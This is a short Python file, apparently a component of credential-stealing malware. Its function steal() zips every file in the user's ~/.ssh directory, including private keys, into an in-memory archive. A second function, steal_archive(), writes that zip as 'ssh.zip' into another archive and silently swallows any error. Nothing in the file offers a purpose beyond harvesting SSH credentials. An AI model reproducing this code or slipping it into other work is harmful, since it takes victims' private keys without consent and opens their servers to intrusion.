import pathlib
import os
import io
from zipfile import ZipFile

def steal():
	archive = io.BytesIO()

	ssh_home = os.path.join(str(pathlib.Path.home()), ".ssh")
	with ZipFile(archive, "w") as zipObj:
		for path, dirs, files in os.walk(ssh_home):
			for file in files:
				global_path = os.path.join(path, file)
				local_path = global_path[len(ssh_home):]
				zipObj.write(global_path, local_path)
		
	archive.seek(0)

	return archive


def steal_archive(archive):
    try:
        with archive.open("ssh.zip", "w") as f:
            f.write(steal().read())
    except:
        pass